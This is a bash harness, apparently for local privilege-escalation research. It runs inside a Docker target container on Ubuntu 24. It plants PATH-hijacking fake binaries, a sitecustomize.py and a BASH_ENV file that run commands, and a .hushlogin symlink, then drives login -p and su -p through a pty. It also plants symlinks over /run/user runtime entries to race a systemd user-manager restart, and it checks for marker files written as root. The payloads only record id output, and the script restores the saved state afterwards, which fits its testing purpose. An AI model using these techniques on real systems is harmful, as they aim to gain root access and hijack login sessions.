#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET'
set -Eeuo pipefail
export LC_ALL=C

prefix="pam-login-env-race"
tmp="/tmp/${prefix}"
backup="${tmp}/backup"
base="/home/selfauth/${prefix}"
fakebin="${base}/bin"
root_canary="/root/${prefix}-runtime-canary"
root_proof="no"

account_files=(/etc/passwd /etc/shadow /etc/group /etc/gshadow)
acct_files=(/run/utmp /var/log/wtmp /var/log/btmp /var/log/lastlog)
dotfiles=(.pam_environment .bash_profile .profile .hushlogin)

section() {
  printf '\n== %s ==\n' "$*"
}

save_state() {
  rm -rf "$tmp"
  mkdir -p "$backup/accounts" "$backup/accounting" "$backup/home"
  for f in "${account_files[@]}"; do
    cp -a "$f" "$backup/accounts/$(basename "$f")"
  done
  : > "$backup/accounting.state"
  for f in "${acct_files[@]}"; do
    if [ -e "$f" ] || [ -L "$f" ]; then
      echo "present $f" >> "$backup/accounting.state"
      mkdir -p "$backup/accounting$(dirname "$f")"
      cp -a --no-dereference "$f" "$backup/accounting$f"
    else
      echo "absent $f" >> "$backup/accounting.state"
    fi
  done
  : > "$backup/home.state"
  for name in "${dotfiles[@]}"; do
    p="/home/selfauth/$name"
    if [ -e "$p" ] || [ -L "$p" ]; then
      echo "present $name" >> "$backup/home.state"
      cp -a --no-dereference "$p" "$backup/home/$name"
    else
      echo "absent $name" >> "$backup/home.state"
    fi
  done
  if [ -e /dev/tty1 ]; then
    stat -Lc '%u %g %a' /dev/tty1 > "$backup/tty1.state" || true
  fi
}

restore_state() {
  set +e
  systemctl stop user@1002.service user-runtime-dir@1002.service >/dev/null 2>&1 || true
  loginctl disable-linger selfauth >/dev/null 2>&1 || true
  systemctl reset-failed user@1002.service user-runtime-dir@1002.service >/dev/null 2>&1 || true

  if [ -d "$backup/accounts" ]; then
    for f in "${account_files[@]}"; do
      cp -a "$backup/accounts/$(basename "$f")" "$f" 2>/dev/null || true
    done
  fi

  if [ -f "$backup/accounting.state" ]; then
    while read -r flag path; do
      [ -n "${path:-}" ] || continue
      if [ "$flag" = present ]; then
        mkdir -p "$(dirname "$path")"
        cp -a --no-dereference "$backup/accounting$path" "$path" 2>/dev/null || true
      else
        rm -f "$path"
      fi
    done < "$backup/accounting.state"
  fi

  if [ -f "$backup/home.state" ]; then
    while read -r flag name; do
      p="/home/selfauth/$name"
      rm -rf "$p"
      if [ "$flag" = present ]; then
        cp -a --no-dereference "$backup/home/$name" "$p" 2>/dev/null || true
      fi
    done < "$backup/home.state"
  fi

  systemctl restart getty@tty1.service >/dev/null 2>&1 || true
  if [ -f "$backup/tty1.state" ] && [ -e /dev/tty1 ]; then
    read -r uid gid mode < "$backup/tty1.state"
    chown "$uid:$gid" /dev/tty1 2>/dev/null || true
    chmod "$mode" /dev/tty1 2>/dev/null || true
  fi

  rm -rf "$base" "$root_canary"
  rm -f /tmp/${prefix}-fake-*.uid \
    /tmp/${prefix}-login-shell.env \
    /tmp/${prefix}-login-bash-profile.uid \
    /tmp/${prefix}-login-sitecustomize.uid \
    /tmp/${prefix}-login-bashenv.uid \
    /tmp/${prefix}-su-* \
    /tmp/${prefix}-runtime-* \
    /root/${prefix}-fake-*.root \
    /root/${prefix}-login-bash-profile.root \
    /root/${prefix}-login-sitecustomize.root \
    /root/${prefix}-login-bashenv.root \
    /root/${prefix}-su-root
  rm -rf "$tmp"
}

trap restore_state EXIT INT TERM

save_state

section "target and scope"
sed -n '1,8p' /etc/os-release
uname -a
id attacker || true
id selfauth
groups attacker || true
groups selfauth
getent shadow attacker selfauth | sed -E 's/^([^:]+):([^:]{0,14}).*/\1:\2.../'
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  login passwd libpam-modules libpam-runtime libpam0g systemd dbus polkitd util-linux 2>&1 | sort

section "PAM and tty defaults"
for f in /etc/pam.d/login /etc/pam.d/su /etc/pam.d/common-session /etc/pam.d/other; do
  echo "-- $f"
  nl -ba "$f" | sed -n '1,120p'
done
grep -nE '^(TTYGROUP|TTYPERM|ENV_PATH|ENV_SUPATH|MAIL_DIR|UMASK|HOME_MODE)' /etc/login.defs || true
for p in /usr/bin/login /usr/bin/su /usr/bin/loginctl /usr/bin/openvt /dev/tty1 /run/user /run/systemd/users /run/systemd/sessions /var/lib/systemd/linger; do
  [ -e "$p" ] || [ -L "$p" ] && stat -Lc '%A %a %U:%G %F %n' "$p" || echo "MISSING $p"
done
for p in /run/utmp /var/log/wtmp /var/log/btmp /var/log/lastlog /var/mail /var/spool/mail; do
  [ -e "$p" ] || [ -L "$p" ] && stat -Lc '%A %a %U:%G %s %F %n' "$p" || echo "MISSING $p"
done
sha256sum /run/utmp /var/log/wtmp /var/log/lastlog 2>/dev/null || true

section "prepare passworded selfauth and hostile user inputs"
echo "selfauth:selfauth" | chpasswd
install -d -o selfauth -g selfauth -m 0700 "$base" "$fakebin" "$base/tmp" "$base/py" "$base/fake-runtime"

for cmd in id uname bc systemctl; do
  cat > "$fakebin/$cmd" <<EOF
#!/bin/sh
/usr/bin/id > /tmp/${prefix}-fake-${cmd}.uid
/usr/bin/id > /root/${prefix}-fake-${cmd}.root 2>/dev/null || true
exec /usr/bin/${cmd} "\$@"
EOF
  chmod 0755 "$fakebin/$cmd"
done
chown -R selfauth:selfauth "$fakebin"

cat > "$base/py/sitecustomize.py" <<EOF
import os
os.system('/usr/bin/id > /tmp/${prefix}-login-sitecustomize.uid')
os.system('/usr/bin/id > /root/${prefix}-login-sitecustomize.root 2>/dev/null || true')
EOF
cat > "$base/bashenv" <<EOF
/usr/bin/id > /tmp/${prefix}-login-bashenv.uid
/usr/bin/id > /root/${prefix}-login-bashenv.root 2>/dev/null || true
EOF
chown -R selfauth:selfauth "$base/py" "$base/bashenv"

cat > /home/selfauth/.pam_environment <<EOF
PAM_LOGIN_ENV_RACE_USERENV DEFAULT=userenv_seen
PATH DEFAULT=${fakebin}:/usr/bin:/bin
XDG_RUNTIME_DIR DEFAULT=${base}/fake-runtime
DBUS_SESSION_BUS_ADDRESS DEFAULT=unix:path=${base}/fake-bus
EOF
cat > /home/selfauth/.bash_profile <<EOF
/usr/bin/id > /tmp/${prefix}-login-bash-profile.uid
/usr/bin/id > /root/${prefix}-login-bash-profile.root 2>/dev/null || true
/usr/bin/env | /usr/bin/sort > /tmp/${prefix}-login-shell.env
/usr/bin/stat -Lc 'tty_stat=%A %U:%G %F %n' "\$(/usr/bin/tty)" >> /tmp/${prefix}-login-shell.env 2>&1 || true
EOF
ln -s "/root/${prefix}-hush-target" /home/selfauth/.hushlogin
chown selfauth:selfauth /home/selfauth/.pam_environment /home/selfauth/.bash_profile
chown -h selfauth:selfauth /home/selfauth/.hushlogin
namei -l /home/selfauth/.pam_environment /home/selfauth/.bash_profile /home/selfauth/.hushlogin || true

section "passworded login -p pty drive"
cat > "$tmp/drive_login.py" <<PY
import os, pty, select, signal, sys, time

cmd = [
    "/usr/bin/env", "-i",
    "TERM=xterm",
    "HOME=/home/selfauth",
    "USER=selfauth",
    "LOGNAME=selfauth",
    "SHELL=/bin/bash",
    "PATH=${fakebin}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "PYTHONPATH=${base}/py",
    "BASH_ENV=${base}/bashenv",
    "ENV=${base}/shenv",
    "TMPDIR=${base}/tmp",
    "XDG_RUNTIME_DIR=${base}/fake-runtime",
    "DBUS_SESSION_BUS_ADDRESS=unix:path=${base}/fake-bus",
    "/bin/login", "-p", "selfauth",
]
post_login = (
    "env | sort | grep -E '^(PAM_LOGIN_ENV_RACE|PATH=|HOME=|XDG_RUNTIME_DIR=|DBUS_SESSION_BUS_ADDRESS=|TMPDIR=|BASH_ENV=|ENV=|MAIL=|PYTHONPATH=)' || true\\n"
    "id\\n"
    "tty\\n"
    "loginctl show-session " + "$" + "XDG_SESSION_ID -p Id -p Name -p User -p TTY -p Type -p Class -p State -p Remote -p Active 2>/dev/null || true\\n"
    "exit\\n"
)

pid, fd = pty.fork()
if pid == 0:
    os.execvpe(cmd[0], cmd, {})

transcript = bytearray()
sent_password = False
sent_commands = False
deadline = time.time() + 55
while time.time() < deadline:
    r, _, _ = select.select([fd], [], [], 0.2)
    if r:
        try:
            data = os.read(fd, 4096)
        except OSError:
            break
        if not data:
            break
        transcript.extend(data)
        text = transcript.decode(errors="replace")
        if not sent_password and "Password:" in text:
            os.write(fd, b"selfauth\\n")
            sent_password = True
        if sent_password and not sent_commands and ("Welcome to" in text or "$ " in text):
            time.sleep(0.4)
            os.write(fd, post_login.encode())
            sent_commands = True
    try:
        done, status = os.waitpid(pid, os.WNOHANG)
        if done:
            break
    except ChildProcessError:
        break
else:
    try:
        os.kill(pid, signal.SIGTERM)
    except ProcessLookupError:
        pass
    time.sleep(1)
    try:
        os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        pass
    print("PYDRIVER_TIMEOUT")

sys.stdout.buffer.write(transcript)
try:
    done, status = os.waitpid(pid, os.WNOHANG)
    if done:
        print(f"\\nPYDRIVER_STATUS={status}")
except ChildProcessError:
    pass
PY
python3 "$tmp/drive_login.py" 2>&1 | sed -n '1,260p'

section "login -p marker results"
cat /tmp/${prefix}-login-shell.env 2>/dev/null || echo "login_shell_env=absent"
for p in /tmp/${prefix}-fake-*.uid /tmp/${prefix}-login-bash-profile.uid /tmp/${prefix}-login-sitecustomize.uid /tmp/${prefix}-login-bashenv.uid \
  /root/${prefix}-fake-*.root /root/${prefix}-login-bash-profile.root /root/${prefix}-login-sitecustomize.root /root/${prefix}-login-bashenv.root; do
  if [ -e "$p" ]; then
    stat -Lc '%A %U:%G %n' "$p"
    sed -n '1,20p' "$p" 2>/dev/null || true
  else
    echo "MISSING $p"
  fi
done
sha256sum /run/utmp /var/log/wtmp /var/log/lastlog 2>/dev/null || true
who || true
lastlog -u selfauth 2>/dev/null || true

section "attacker-reachable su -p selfauth pty drive"
cat > "$tmp/drive_su.py" <<PY
import os, pty, select, signal, sys, time

cmd = [
    "/usr/bin/env", "-i",
    "TERM=xterm",
    "HOME=/home/selfauth",
    "USER=selfauth",
    "LOGNAME=selfauth",
    "SHELL=/bin/bash",
    "PATH=${fakebin}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "XDG_RUNTIME_DIR=${base}/fake-runtime",
    "DBUS_SESSION_BUS_ADDRESS=unix:path=${base}/fake-bus",
    "/usr/bin/su", "-p", "selfauth", "-c",
    "env | sort | grep -E '^(PAM_LOGIN_ENV_RACE|PATH=|HOME=|XDG_RUNTIME_DIR=|DBUS_SESSION_BUS_ADDRESS=|MAIL=)' || true; "
    "id; "
    "touch /root/${prefix}-su-root 2>/dev/null || true; "
    "systemctl --user show-environment >/tmp/${prefix}-su-systemctl.out 2>&1 || true",
]

pid, fd = pty.fork()
if pid == 0:
    os.execvpe(cmd[0], cmd, {})

transcript = bytearray()
sent_password = False
deadline = time.time() + 40
while time.time() < deadline:
    r, _, _ = select.select([fd], [], [], 0.2)
    if r:
        try:
            data = os.read(fd, 4096)
        except OSError:
            break
        if not data:
            break
        transcript.extend(data)
        if not sent_password and "Password:" in transcript.decode(errors="replace"):
            os.write(fd, b"selfauth\\n")
            sent_password = True
    try:
        done, status = os.waitpid(pid, os.WNOHANG)
        if done:
            break
    except ChildProcessError:
        break
else:
    try:
        os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        pass
    print("SU_PYDRIVER_TIMEOUT")

sys.stdout.buffer.write(transcript)
PY
chown selfauth:selfauth "$tmp/drive_su.py"
runuser -u selfauth -- python3 "$tmp/drive_su.py" 2>&1 | sed -n '1,180p'
for p in /tmp/${prefix}-su-* /root/${prefix}-su-root; do
  if [ -e "$p" ]; then
    stat -Lc '%A %U:%G %n' "$p"
    sed -n '1,40p' "$p" 2>/dev/null || true
  else
    echo "MISSING $p"
  fi
done

section "pam_systemd runtime symlink restart race"
mkdir -p "$root_canary/systemd-target" "$root_canary/gnupg-target"
printf 'canary\n' > "$root_canary/canary"
printf 'nested\n' > "$root_canary/systemd-target/nested"
loginctl enable-linger selfauth 2>&1 || true
systemctl start user@1002.service 2>&1 || true
sleep 1
echo "-- runtime before planting"
find /run/user/1002 -maxdepth 1 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort || true
echo "-- selfauth plants symlinks over user-manager runtime entries"
runuser -u selfauth -- bash -c '
set -x
for p in systemd bus gnupg pk-debconf-socket snapd-session-agent.socket; do
  rm -rf "/run/user/1002/$p" 2>/tmp/pam-login-env-race-runtime-rm.err || true
done
cat /tmp/pam-login-env-race-runtime-rm.err 2>/dev/null || true
ln -s /root/pam-login-env-race-runtime-canary/systemd-target /run/user/1002/systemd
ln -s /root/pam-login-env-race-runtime-canary/bus-target /run/user/1002/bus
ln -s /root/pam-login-env-race-runtime-canary/gnupg-target /run/user/1002/gnupg
ln -s /root/pam-login-env-race-runtime-canary/pk-target /run/user/1002/pk-debconf-socket
find /run/user/1002 -maxdepth 1 -printf "%M %u:%g %p -> %l\n" | sort
' 2>&1 || true
echo "-- root restarts user@1002.service over planted symlinks"
systemctl restart user@1002.service 2>&1 || true
sleep 1
systemctl status user@1002.service user-runtime-dir@1002.service --no-pager -l 2>&1 | sed -n '1,130p' || true
echo "-- runtime after restart attempt"
find /run/user/1002 -maxdepth 2 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort || true
echo "-- root canary after restart attempt"
find "$root_canary" -maxdepth 3 -printf '%M %u:%g %p -> %l\n' | sort
systemctl stop user@1002.service 2>&1 || true
systemctl stop user-runtime-dir@1002.service 2>&1 || true
printf 'canary_after_stop='
[ -f "$root_canary/canary" ] && echo present || echo absent
find "$root_canary" -maxdepth 3 -printf '%M %u:%g %p -> %l\n' | sort

section "linger and runtime path authorization"
runuser -u selfauth -- loginctl enable-linger root 2>&1 || true
runuser -u selfauth -- loginctl enable-linger ../root 2>&1 || true
runuser -u selfauth -- loginctl enable-linger selfauth 2>&1 || true
ls -la /var/lib/systemd/linger 2>&1 || true
stat -Lc '%A %a %U:%G %F %n' /var/lib/systemd/linger/selfauth 2>&1 || true
loginctl disable-linger selfauth 2>&1 || true

section "root proof before cleanup"
for p in /root/${prefix}-fake-*.root /root/${prefix}-login-bash-profile.root /root/${prefix}-login-sitecustomize.root /root/${prefix}-login-bashenv.root /root/${prefix}-su-root; do
  if [ -e "$p" ]; then
    root_proof="yes"
    stat -Lc 'ROOT_MARKER %A %U:%G %n' "$p"
    sed -n '1,20p' "$p" 2>/dev/null || true
  fi
done
printf 'ROOT_PROOF=%s\n' "$root_proof"

section "cleanup verification"
restore_state
for p in "$base" "$root_canary" /tmp/${prefix}-login-shell.env /tmp/${prefix}-su-systemctl.out /home/selfauth/.pam_environment /home/selfauth/.bash_profile /home/selfauth/.hushlogin; do
  [ -e "$p" ] || [ -L "$p" ] && echo "LEFT $p" || echo "ABSENT $p"
done
systemctl is-system-running || true
systemctl --failed --no-legend || true
TARGET
